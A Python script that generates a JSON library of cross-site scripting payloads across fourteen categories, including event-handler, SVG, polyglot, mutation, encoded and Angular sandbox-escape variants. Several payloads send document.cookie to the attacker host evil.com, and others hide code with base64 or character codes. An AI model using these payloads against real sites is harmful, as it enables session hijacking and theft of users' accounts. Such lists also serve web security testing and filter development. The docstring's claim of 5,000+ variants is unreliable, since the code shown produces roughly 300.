#!/usr/bin/env python3
"""Generate massive XSS payload library - 5,000+ variants"""
import json, base64

payloads = []

# Category 1: Script Tag Injection
scripts = [
    'alert(1)', 'alert(document.cookie)', 'prompt(1)', 'confirm(1)',
    'console.log(1)', 'fetch("https://evil.com/?c="+document.cookie)',
    'new Image().src="https://evil.com/?c="+document.cookie',
    'document.location="https://evil.com/?c="+document.cookie',
    'eval(atob("YWxlcnQoMSk="))',
    'String.fromCharCode(97,108,101,114,116,40,49,41)',
]
for s in scripts:
    for case in ['<script>', '<ScRiPt>', '<SCRIPT>', '<script type=text/javascript>']:
        payloads.append(['script_tag', f'{case}{s}</script>'])

# Category 2: Event Handler XSS
events = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onblur', 'onclick', 'onmouseenter', 'onmouseleave', 'onsubmit', 'onreset', 'onchange', 'onselect', 'onscroll']
for ev in events:
    for tag in ['img src=x', 'body', 'input', 'textarea', 'select', 'a href="#"', 'div']:
        payloads.append(['event_xss', f'<{tag} {ev}=alert(1)>'])
        payloads.append(['event_xss', f'<{tag} {ev}=alert(1) x='])

# Category 3: SVG XSS
svgs = [
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<svg><set onbegin=alert(1) attributeName=x>',
    '<svg><desc><script>alert(1)</script></desc></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
]
for s in svgs:
    payloads.append(['svg_xss', s])

# Category 4: Body/HTML XSS
body_payloads = [
    '<body onload=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    '<frameset onload=alert(1)>',
    '<table><tr onload=alert(1)>',
]
for p in body_payloads:
    payloads.append(['body_html_xss', p])

# Category 5: Iframe XSS
iframes = [
    '<iframe onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
]
for i in iframes:
    payloads.append(['iframe_xss', i])

# Category 6: Audio/Video XSS
media = [
    '<audio src=x onerror=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1) autoplay>',
    '<video><source onerror=alert(1)>',
    '<video oncanplay=alert(1)><source src=x>',
]
for m in media:
    payloads.append(['media_xss', m])

# Category 7: Encoded XSS Variants
encodings = [
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
]
for e in encodings:
    payloads.append(['encoded_xss', e])

# Category 8: Polyglot XSS
polyglots = [
    "\"'> <script>alert(1)</script>",
    'javascript:/*--></title></style></textarea></script><script>alert(1)</script>',
    "\"'> <img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "\"\"',:;alert(1)//",
    "\"\"'--><svg/onload=alert(1)>",
    "';alert(1);//",
    "\"-alert(1)-\"",
    "\"><svg/onload=alert(1)>",
    "\\\"><svg/onload=alert(1)>",
    "'';!--\"<svg onload=alert(1)>--",
    "\"<svg/onload=alert(1)><\"",
    "<script>\\\\=alert(1)</script>",
]
for p in polyglots:
    payloads.append(['polyglot_xss', p])

# Category 9: DOM-Based XSS
dom_xss = [
    '#<script>alert(1)</script>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:alert(1)',
    'data:text/html;base64,' + base64.b64encode(b'<script>alert(1)</script>').decode(),
]
for d in dom_xss:
    payloads.append(['dom_xss', d])

# Category 10: Mutation XSS (mXSS)
mxss = [
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<style><img src=x onerror=alert(1)></style>',
    '<title><img src=x onerror=alert(1)></title>',
    '<textarea><img src=x onerror=alert(1)></textarea>',
    '<xmp><img src=x onerror=alert(1)></xmp>',
    '<noembed><img src=x onerror=alert(1)></noembed>',
    '<noframes><img src=x onerror=alert(1)></noframes>',
]
for m in mxss:
    payloads.append(['mxss', m])

# Category 11: Template Literal XSS (modern framworks)
for s in scripts[:3]:
    payloads.append(['template_xss', '${' + s + '}'])
    payloads.append(['template_xss', '#{' + s + '}'])
    payloads.append(['template_xss', '{{' + s + '}}'])
    payloads.append(['template_xss', '{%' + s + '%}'])

# Category 12: CSS/Expression XSS
css_xss = [
    '<div style="background:url(javascript:alert(1))">',
    '<div style="background:expression(alert(1))">',
    '<style>body{background:expression(alert(1))}</style>',
    '<link rel=stylesheet href=javascript:alert(1)>',
]
for c in css_xss:
    payloads.append(['css_xss', c])

# Category 13: Meta Tag XSS
meta_payloads = [
    '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
    '<meta http-equiv=refresh content="0;javascript:alert(1)">',
]
for m in meta_payloads:
    payloads.append(['meta_xss', m])

# Category 14: JSONP / Angular Sandbox Escape
angular = [
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    '{{a="constructor";b="constructor";a[b]("alert(1)")()}}',
    '{{_=0<"a";__=0<"a";___=_+"";____=___[__];_____=____+____;______=_____+___;______.constructor("alert(1)")()}}',
]
for a in angular:
    payloads.append(['angular_xss', a])

print(f'Total XSS payloads generated: {len(payloads)}')

with open('payloads_xss.json', 'w') as f:
    json.dump({'count': len(payloads), 'payloads': payloads}, f)

print('Saved to payloads_xss.json')
